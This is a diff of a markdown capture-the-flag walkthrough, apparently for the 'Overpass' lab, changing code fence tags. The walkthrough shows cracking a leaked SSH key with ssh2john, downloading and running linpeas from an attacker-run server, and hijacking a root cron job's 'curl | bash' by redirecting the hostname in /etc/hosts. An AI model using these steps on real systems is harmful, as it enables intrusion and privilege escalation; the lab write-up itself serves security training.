@@ -10,7 +10,7 @@
 6. Page shows private RSA Key which is  a SSH Key.
 7. We will copy the complete key and save it as `id_rsa`.
 8. Then we will convert in into hash by 
-```bash
+```console
 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
 ```
 9. Then we will crack the hash by 
@@ -24,23 +24,23 @@ chmod 600 id_rsa && ssh -i id_rsa john@10.10.161.104
 ```
 12. We are in and got user flag in `user.txt`.
 13. We will download linpeas on aur host machine by 
-```bash
+```console
 wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
 ```
 and will roll up a python https server in the same directory by 
-```bash
+```console
 python3 -m http.server
 ```
 14. Then we will download linpeas with 
-```bash
+```console
 wget http://{your ip}:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
 ```
 15. Found a cron job which can download any script we want as **ROOT** `curl overpass.thm/downloads/src/buildscript.sh | bash`.
 16. So we will create a fake buildscript.sh in `downloads/src/buildscript.sh` and add 
-```bash
+```console
 cat /root/root.txt > /home/john/stuff.txt
 ```
- script in buildscript.sh. 
+script in buildscript.sh. 
 17. We will update overpass.thm to our ip in `/etc/hosts`. 
 18. Then we will run up new server in directory with `downloads/src/buildscript.sh`.
 19. Read stuff.txt in `/home/james` and that is the root.txt.
